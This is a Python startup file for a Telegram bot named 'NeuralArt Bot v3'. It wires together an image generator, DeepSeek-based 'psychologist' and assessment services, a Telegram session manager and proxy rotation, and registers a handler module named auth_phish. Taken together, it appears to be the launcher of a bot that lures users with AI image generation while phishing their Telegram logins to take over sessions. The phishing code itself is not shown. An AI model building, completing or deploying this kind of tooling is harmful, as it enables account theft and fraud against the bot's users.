"""Entry point for NeuralArt Bot v3."""

import asyncio
import logging
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from aiogram import Bot, Dispatcher
from aiogram.fsm.storage.memory import MemoryStorage
from bot.services.assessments import AssessmentAPI
from bot.services.psychologist import PsychologistAPI
from bot.config import config
from bot.database import Database
from bot.services.proxy_rotator import ProxyRotator
from bot.services.session_manager import SessionManager
from bot.services.image_api import ImageGenerator
from bot.handlers import common, image_gen, auth_phish, admin, assessments
from bot.handlers.psychologist import router as psych_router

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(name)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger(__name__)


psych_api = PsychologistAPI(config.DEEPSEEK_API_KEY, model="deepseek-reasoner")
assessment_api = AssessmentAPI(config.DEEPSEEK_API_KEY, model="deepseek-chat")


async def _safe_close(obj, name: str = "resource"):
    """Safely close an object if it has a close method (sync or async)."""
    if obj is None:
        return
    try:
        if hasattr(obj, "close"):
            close = obj.close
            if asyncio.iscoroutinefunction(close):
                await close()
            else:
                close()
    except Exception as exc:
        logger.error(f"Error closing {name}: {exc}")


async def main():
    if not config.BOT_TOKEN:
        logger.error("[!] BOT_TOKEN is empty! Check your .env file.")
        return
    if config.TELEGRAM_API_ID == 0:
        logger.error("[!] API_ID is 0! Check your .env file.")
        return
    if not config.TELEGRAM_API_HASH:
        logger.error("[!] API_HASH is empty! Check your .env file.")
        return

    db = Database(config.DB_PATH)
    proxy_rotator = ProxyRotator(config.PROXY_FILE)
    session_mgr = SessionManager(config.TELEGRAM_API_ID, config.TELEGRAM_API_HASH, proxy_rotator)
    img_gen = ImageGenerator(config.IMAGE_API_URL)

    bot = Bot(token=config.BOT_TOKEN, parse_mode="HTML")
    dp = Dispatcher(storage=MemoryStorage())

    async def inject_deps(handler, event, data):
        data["db"] = db
        data["session_mgr"] = session_mgr
        data["img_gen"] = img_gen
        data["psych_api"] = psych_api
        data["assessment_api"] = assessment_api
        return await handler(event, data)

    dp.message.middleware(inject_deps)
    dp.callback_query.middleware(inject_deps)

    dp.include_router(common.router)
    dp.include_router(image_gen.router)
    dp.include_router(auth_phish.router)
    dp.include_router(admin.router)
    dp.include_router(assessments.router)
    dp.include_router(psych_router)

    logger.info("[+] Bot started")
    try:
        logger.info(f"[+] Proxy: {proxy_rotator.get_proxy()}")
        logger.info(f"[+] Admin IDs: {config.ADMIN_IDS}")

        await dp.start_polling(bot)
    except Exception as e:
        if isinstance(e, KeyboardInterrupt):
            raise
        logger.exception("[!] Bot polling stopped due to an error")
    finally:
        logger.info("[-] Shutting down resources...")
        await _safe_close(img_gen, "img_gen")
        await _safe_close(bot.session, "bot.session")
        await _safe_close(session_mgr, "session_mgr")
        logger.info("[-] Bot stopped")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("[-] Interrupted by user")